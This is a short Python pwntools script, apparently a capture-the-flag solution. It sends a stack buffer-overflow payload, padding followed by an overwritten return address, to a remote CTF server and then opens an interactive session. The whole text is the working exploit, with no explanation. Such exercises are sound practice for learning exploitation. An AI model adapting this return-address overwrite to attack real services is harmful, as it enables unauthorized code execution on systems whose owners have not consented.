from pwn import *

payload = "0123456789012345678901234567890188888888\x66\x05\x40\x00\x00\x00\x00\x00"

r = remote('csie.ctf.tw', 10120)
r.sendline(payload)
r.interactive()
